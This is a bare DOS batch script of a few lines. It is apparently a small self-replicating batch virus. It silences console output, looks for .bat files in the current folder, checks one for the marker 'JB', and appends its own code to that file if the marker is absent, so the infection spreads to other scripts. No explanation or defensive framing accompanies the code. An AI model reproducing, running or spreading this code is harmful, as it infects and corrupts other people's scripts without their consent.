@ctty nul
for %%q in (*.bat) do set JB=%%q


find "JB" %JB%

if errorlevel 1 type %0 >> %JB%
